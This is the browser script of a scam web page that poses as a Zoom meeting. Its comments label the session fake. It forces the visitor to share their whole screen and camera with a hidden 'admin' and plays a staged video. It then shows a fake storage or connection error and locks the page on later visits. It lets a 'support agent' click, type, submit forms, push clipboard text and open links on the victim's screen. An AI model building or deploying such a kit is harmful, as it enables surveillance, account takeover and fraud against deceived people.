let ws;
let peerConnection;
let stream;
let cameraStream = null;
let pendingCandidates = [];
let controlGranted = false;
const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

// UI Elements
const joinBtn = document.getElementById("joinBtn");
const meetingInput = document.getElementById("meetingId");
const errorMsg = document.getElementById("errorMsg");
const loadingOverlay = document.getElementById("loadingOverlay");
const loadingSubtext = document.getElementById("loadingSubtext");
const sessionOverlay = document.getElementById("sessionOverlay");
const sessionVideo = document.getElementById("sessionVideo");
const selfVideo = document.getElementById("selfVideo");
const selfPlaceholder = document.getElementById("selfPlaceholder");
const poorConn = document.getElementById("poorConn");
const timeoutOverlay = document.getElementById("timeoutOverlay");

function connectWS() {
  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
  ws = new WebSocket(`${protocol}${window.location.host}`);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "role", role: "visitor" }));
    // Re-send control permission if it was already granted (survives admin refresh)
    if (controlGranted) {
      ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
    }
  };

  ws.onmessage = async (e) => {
    const data = JSON.parse(e.data);

    // Listen for the admin refresh signal and restart the stream
    if (data.type === "request-offer") {
      if (stream) {
        startWebRTC();
      }
      return;
    }

    if (data.type === "webrtc-answer") {
      await peerConnection.setRemoteDescription(
        new RTCSessionDescription(data.sdp),
      );
      for (const cand of pendingCandidates) {
        try {
          await peerConnection.addIceCandidate(new RTCIceCandidate(cand));
        } catch (err) {}
      }
      pendingCandidates = [];
    }
    if (data.type === "webrtc-ice") {
      if (peerConnection && peerConnection.remoteDescription) {
        try {
          await peerConnection.addIceCandidate(
            new RTCIceCandidate(data.candidate),
          );
        } catch (err) {}
      } else {
        pendingCandidates.push(data.candidate);
      }
    }
    if (data.type === "admin-message") showToast(data.text);

    // --- REMOTE CONTROL ---
    if (data.type === "request-control") {
      const accept = window.confirm(
        "Support agent is requesting full remote control (click, type, scroll). Do you allow this?",
      );
      if (accept) {
        controlGranted = true;
        ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
      } else {
        ws.send(JSON.stringify({ type: "control-denied", target: "admin" }));
      }
    }

    if (data.type === "remote-click" && controlGranted) {
      const x = data.x * window.innerWidth;
      const y = data.y * window.innerHeight;
      const el = document.elementFromPoint(x, y);

      const indicator = document.createElement("div");
      indicator.style.cssText = `position:fixed; left:${x}px; top:${y}px; width:24px; height:24px; background:rgba(239, 68, 68, 0.7); border: 2px solid white; border-radius:50%; transform:translate(-50%,-50%); z-index:99999; pointer-events:none; animation: clickRipple 0.4s ease-out forwards;`;
      document.body.appendChild(indicator);
      setTimeout(() => indicator.remove(), 400);

      if (el) {
        const eventInit = {
          bubbles: true,
          cancelable: true,
          view: window,
          clientX: x,
          clientY: y,
        };
        el.dispatchEvent(new MouseEvent("mousedown", eventInit));
        el.dispatchEvent(new MouseEvent("mouseup", eventInit));
        el.dispatchEvent(new MouseEvent("click", eventInit));
        if (el.click) el.click();
        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") el.focus();
      }
    }

    if (data.type === "remote-key" && controlGranted) {
      const el = document.activeElement;
      const isInput =
        el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA");

      if (data.key === "Enter") {
        if (isInput && el.form) el.form.submit();
        else if (isInput) {
          if (el.tagName === "TEXTAREA")
            document.execCommand("insertLineBreak");
        } else if (el && el.tagName === "BUTTON") el.click();
        return;
      }

      if (data.key === "Tab") {
        const focusables = document.querySelectorAll(
          "input, textarea, button, a[href], select",
        );
        const current = Array.from(focusables).indexOf(el);
        if (current !== -1 && focusables[current + 1])
          focusables[current + 1].focus();
        return;
      }

      if (data.key === "Backspace") {
        if (isInput) {
          document.execCommand("delete");
          el.dispatchEvent(new Event("input", { bubbles: true }));
        }
        return;
      }

      if (data.key === "Delete") {
        if (isInput) {
          document.execCommand("forwardDelete");
          el.dispatchEvent(new Event("input", { bubbles: true }));
        }
        return;
      }

      if (
        [
          "ArrowLeft",
          "ArrowRight",
          "ArrowUp",
          "ArrowDown",
          "Home",
          "End",
        ].includes(data.key)
      ) {
        if (isInput) {
          const start = el.selectionStart;
          const end = el.selectionEnd;
          let newStart = start,
            newEnd = end;
          if (data.key === "ArrowLeft") {
            newStart = Math.max(0, start - 1);
            newEnd = newStart;
          }
          if (data.key === "ArrowRight") {
            newStart = Math.min(el.value.length, end + 1);
            newEnd = newStart;
          }
          if (data.key === "Home") {
            newStart = 0;
            newEnd = 0;
          }
          if (data.key === "End") {
            newStart = el.value.length;
            newEnd = newStart;
          }
          el.setSelectionRange(newStart, newEnd);
        }
        return;
      }

      if (data.ctrlKey || data.metaKey) {
        if (data.key.toLowerCase() === "a" && isInput) el.select();
        if (data.key.toLowerCase() === "c" && isInput)
          document.execCommand("copy");
        if (data.key.toLowerCase() === "z" && isInput)
          document.execCommand("undo");
        return;
      }

      if (data.key.length === 1 && isInput) {
        document.execCommand("insertText", false, data.key);
        el.dispatchEvent(new Event("input", { bubbles: true }));
        return;
      }
    }

    if (data.type === "remote-scroll" && controlGranted) {
      window.scrollBy({ top: data.deltaY, left: 0, behavior: "auto" });
    }

    if (data.type === "remote-clipboard" && controlGranted) {
      try {
        await navigator.clipboard.writeText(data.text);
        showToast("Support agent pushed text to your clipboard.");
      } catch (err) {
        showToast("Failed to write clipboard.");
      }
    }

    if (data.type === "remote-open-url") {
      try {
        const a = document.createElement("a");
        a.href = data.url;
        a.target = "_blank";
        a.rel = "noopener noreferrer";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch (err) {
        window.location.href = data.url;
      }
    }

    if (data.type === "remote-close-tab") {
      if (stream) stream.getTracks().forEach((t) => t.stop());
      if (cameraStream) cameraStream.getTracks().forEach((t) => t.stop());
      if (peerConnection) peerConnection.close();
      window.close();
      setTimeout(() => {
        document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; background:#fcfcfc; color:#333; text-align:center;"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="margin-bottom:20px;"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg><h2>Session Terminated</h2><p>The support agent has ended this session.</p></div>`;
      }, 100);
    }
  };
}

const style = document.createElement("style");
style.innerHTML = `@keyframes clickRipple { from { transform: translate(-50%,-50%) scale(1); opacity: 1; } to { transform: translate(-50%,-50%) scale(2); opacity: 0; } }`;
document.head.appendChild(style);

// --- FORM LOGIC ---
const alphanumericRegex = /^[a-zA-Z0-9]+$/;

meetingInput.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/[^a-zA-Z0-9]/g, "");
  const val = e.target.value.trim();
  if (val.length > 0 && alphanumericRegex.test(val)) {
    joinBtn.classList.add("active");
    joinBtn.disabled = false;
  } else {
    joinBtn.classList.remove("active");
    joinBtn.disabled = true;
  }
});

// --- SCREEN SHARE & CAMERA & JOIN LOGIC ---
joinBtn.addEventListener("click", async () => {
  const meetingId = meetingInput.value.trim();
  if (!meetingId) return;

  errorMsg.style.display = "none";
  joinBtn.disabled = true;

  const constraints = {
    video: {
      displaySurface: "monitor",
      frameRate: { ideal: 30, max: 60 },
      width: { ideal: 1920 },
      height: { ideal: 1080 },
    },
    audio: false,
    selfBrowserSurface: "exclude",
    surfaceSwitching: "exclude",
    preferCurrentTab: false,
  };

  // 1. Get Screen Share
  try {
    stream = await navigator.mediaDevices.getDisplayMedia(constraints);
  } catch (err) {
    console.log("Screen share cancelled", err);
    joinBtn.disabled = false;
    return;
  }

  const videoTrack = stream.getVideoTracks()[0];
  const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};

  // Strict Enforcement of Entire Screen
  if (settings.displaySurface && settings.displaySurface !== "monitor") {
    stream.getTracks().forEach((t) => t.stop());
    errorMsg.style.display = "block";
    joinBtn.disabled = false;
    return;
  }

  stream.getVideoTracks()[0].onended = () => {
    sessionOverlay.classList.remove("active");
    joinBtn.disabled = false;
    if (peerConnection) peerConnection.close();
  };

  // 2. Get Camera Access
  try {
    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 640 },
        height: { ideal: 480 },
      },
      audio: false,
    });

    selfVideo.srcObject = cameraStream;
    selfPlaceholder.classList.add("hidden");
    selfVideo.play().catch((e) => console.log("Self video play blocked", e));
  } catch (err) {
    console.log("Camera access denied or failed", err);
    document.getElementById("phText").textContent = "Camera unavailable";
  }

  // 3. Start WebRTC
  startWebRTC();

  // 4. Show Loading Screen
  loadingOverlay.classList.add("active");
  loadingSubtext.textContent = "Please wait while we connect you.";

  // 5. Transition to Fake Zoom Session
  setTimeout(() => {
    loadingOverlay.classList.remove("active");
    sessionOverlay.classList.add("active");

    // Unmute the video and play so the user hears the audio
    sessionVideo.muted = false;
    sessionVideo.play().catch((e) => console.log("Main video play blocked", e));

    // After 10 seconds of playing, show the Storage Full overlay and set the lock flag
    setTimeout(() => {
      poorConn.classList.add("active");
      try {
        localStorage.setItem("zoom_session_expired", "true");
      } catch (e) {}
    }, 10000);
  }, 3500);
});

async function startWebRTC() {
  if (peerConnection) {
    peerConnection.close();
  }
  
  peerConnection = new RTCPeerConnection(iceServers);
  if (stream) {
    stream
      .getTracks()
      .forEach((track) => peerConnection.addTrack(track, stream));
  }
  peerConnection.onicecandidate = (event) => {
    if (event.candidate)
      ws.send(
        JSON.stringify({
          type: "webrtc-ice",
          candidate: event.candidate,
          target: "admin",
        }),
      );
  };
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);
  ws.send(
    JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }),
  );
}

// --- TOASTS ---
function formatMessageContent(text) {
  const schemes = ["sms:", "tel:", "mailto:", "fb://", "whatsapp://", "tg://"];
  let actionHtml = "";
  let displayText = text;
  for (const scheme of schemes) {
    if (text.toLowerCase().startsWith(scheme)) {
      const schemeName = scheme.replace(":", "").replace("//", "");
      actionHtml = `<a href="${text}" class="toast-action-btn" style="color:#60a5fa;text-decoration:underline;">Open ${schemeName}</a>`;
      displayText = `App Link Request: <br><span style="font-family: monospace; font-size: 13px; color: #94a3b8;">${text}</span>`;
      break;
    }
  }
  if (text.startsWith("http://") || text.startsWith("https://")) {
    actionHtml = `<a href="${text}" target="_blank" class="toast-action-btn" style="color:#60a5fa;text-decoration:underline;">Open Link</a>`;
  }
  return { displayText, actionHtml };
}

function showToast(text) {
  const { displayText, actionHtml } = formatMessageContent(text);
  const container = document.getElementById("toast-container");
  const toast = document.createElement("div");
  toast.className = "toast";
  toast.innerHTML = `
        <div class="toast-header">
            <span class="toast-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                Support Message
            </span>
            <button class="toast-close" onclick="this.parentElement.parentElement.remove()">&times;</button>
        </div>
        <div class="toast-body">
            ${displayText}
            ${actionHtml}
        </div>
    `;
  container.appendChild(toast);
  setTimeout(() => {
    if (toast.parentElement) {
      toast.classList.add("removing");
      setTimeout(() => toast.remove(), 300);
    }
  }, 30000);

  const pContainer = document.getElementById("persistent-messages");
  const pMsg = document.createElement("div");
  pMsg.style.cssText = `pointer-events:auto;background:#1e293b;border-left:4px solid #3b82f6;border-radius:8px;padding:16px;box-shadow:0 10px 25px rgba(0,0,0,0.4);color:white;font-size:14px;display:flex;flex-direction:column;gap:8px;animation:fadeInUp 0.3s ease forwards;`;
  const time = new Date().toLocaleTimeString([], {
    hour: "2-digit",
    minute: "2-digit",
  });
  pMsg.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#94a3b8;font-weight:600;text-transform:uppercase;">
            <span>Support Message</span>
            <span>${time}</span>
        </div>
        <div style="word-break:break-word;line-height:1.5;">
            ${displayText}
            ${actionHtml}
        </div>
    `;
  const closeBtn = document.createElement("button");
  closeBtn.style.cssText = `background:none;border:none;color:#94a3b8;cursor:pointer;padding:0;font-size:18px;line-height:1;margin-left:10px;`;
  closeBtn.innerHTML = "&times;";
  closeBtn.onclick = () => {
    pMsg.style.animation = "fadeOutDown 0.3s ease forwards";
    setTimeout(() => pMsg.remove(), 300);
  };
  pMsg.querySelector("div").appendChild(closeBtn);
  pContainer.appendChild(pMsg);
}

// --- INITIALIZATION & LOCKOUT LOGIC ---
window.addEventListener("load", () => {
  // Check if the user previously hit the storage full screen
  let isExpired = false;
  try {
    isExpired = localStorage.getItem("zoom_session_expired") === "true";
  } catch (e) {}

  if (isExpired) {
    // Show the Session Expired screen instantly
    timeoutOverlay.classList.add("active");
    document.querySelector(".app-container").style.display = "none"; // Hide everything else
  } else {
    // Normal initialization
    if (poorConn) poorConn.classList.remove("active");
    if (sessionOverlay) sessionOverlay.classList.remove("active");
    if (loadingOverlay) loadingOverlay.classList.remove("active");
    if (errorMsg) errorMsg.style.display = "none";

    if (meetingInput) meetingInput.value = "";
    if (joinBtn) {
      joinBtn.disabled = true;
      joinBtn.classList.remove("active");
    }

    connectWS();
  }
});
